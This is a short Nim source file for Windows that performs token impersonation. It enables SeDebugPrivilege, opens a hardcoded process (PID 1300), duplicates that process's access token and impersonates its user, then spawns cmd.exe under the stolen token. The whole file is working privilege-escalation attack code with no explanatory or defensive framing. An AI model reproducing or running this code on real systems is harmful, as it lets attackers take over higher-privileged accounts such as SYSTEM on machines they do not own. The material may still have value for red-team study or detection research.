import winim
import std/strformat


proc EnablePrivileges(hToken: HANDLE, lpszPrivilege: LPCTSTR,
        bEnablePrivilege: BOOL) =

    var tp: TOKEN_PRIVILEGES
    var luid: LUID

    if bool(LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) == FALSE:
        echo "LookupPrivilegeValue() Failed :("
        echo "Error code : %d", GetLastError()

    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    if bEnablePrivilege:
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    else:
        tp.Privileges[0].Attributes = 0

    if bool(AdjustTokenPrivileges(hToken, FALSE, &tp, DWORD(sizeof(
            TOKEN_PRIVILEGES)), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) == FALSE:
        echo "AdjustTokenPrivileges() Failed :("

    echo "Privileges enabled! ;)\n"

proc main() =
    var pid_to_impersonate: int = 1300
    var TokenHandle: HANDLE
    var DuplicateTokenHandle: HANDLE
    var startupInfo: STARTUPINFO
    var processInformation: PROCESS_INFORMATION
    ZeroMemory(&startupInfo, sizeof(STARTUPINFO))
    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION))
    startupInfo.cb = DWORD(sizeof(STARTUPINFO))

    var CurrentTokenHandle: HANDLE
    var getCurrentToken: BOOL = OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle)
    if bool(getCurrentToken) == FALSE:
        echo "Couldn't retrieve current process token ;(\n"
        echo "Error code : %d", GetLastError()

    EnablePrivileges(CurrentTokenHandle, SE_DEBUG_NAME, TRUE)

    var rProc: HANDLE = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE,
            DWORD(pid_to_impersonate))

    var rToken: BOOL = OpenProcessToken(rProc, TOKEN_DUPLICATE or
            TOKEN_ASSIGN_PRIMARY or TOKEN_QUERY, &TokenHandle)
    if bool(rToken) == FALSE:
        echo "OpenProcessToken() Failed ;(\n"
        echo fmt"Error code : {GetLastError()}\n"

    var ImpersonateUser: BOOL = ImpersonateLoggedOnUser(TokenHandle)

    if bool(ImpersonateUser) == FALSE:
        echo "ImpersonateLoggedOnUser() Failed ;(\n"
        echo fmt"Error code : {GetLastError()}\n"

    if (bool(DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL,
            securityImpersonation, tokenPrimary,
            &DuplicateTokenHandle)) == FALSE):
        echo "DuplicateTokenEx() Failed ;(\n"
        echo fmt"Error code : {GetLastError()}\n"

    if (bool(CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE,
            L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL,
            &startupInfo, &processInformation)) == FALSE):
        echo "CreateProcessWithTokenW() Failed ;(\n"
        echo fmt"Error code : {GetLastError()}\n"

when is_main_module:
    main()
